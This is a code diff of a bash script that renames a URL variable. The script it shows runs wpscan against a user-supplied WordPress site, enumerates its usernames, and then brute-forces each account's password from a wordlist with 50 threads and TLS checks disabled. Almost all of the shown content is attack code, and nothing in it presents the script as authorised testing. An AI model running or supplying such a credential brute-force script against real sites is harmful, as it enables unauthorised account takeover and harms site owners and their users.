@@ -126,7 +126,7 @@ done
 #### 
 
 # Prompt user for WordPress URL
-read -p "Enter the target WordPress URL: " TARGET_URL
+read -p "Enter the target WordPress URL: " website_url
 
 # Prompt user to choose a wordlist
 echo "Choose a wordlist from the options below: "
@@ -141,7 +141,7 @@ done
 
 # Perform user enumeration
 echo "Performing user enumeration..."
-wpscan --url "$TARGET_URL" --enumerate u > user_enum.txt
+wpscan --url "$website_url" --enumerate u > user_enum.txt
 
 # Extract usernames from the user enumeration result
 USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
@@ -149,7 +149,7 @@ USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
 # Perform brute force attack for each username
 for USERNAME in $USERLIST; do
     echo "Performing brute force attack for user: $USERNAME..."
-    wpscan --url "$TARGET_URL" --passwords "$PASSWORDLIST" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
+    wpscan --url "$website_url" --passwords "$PASSWORDLIST" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
 done
 
 # Call Functions
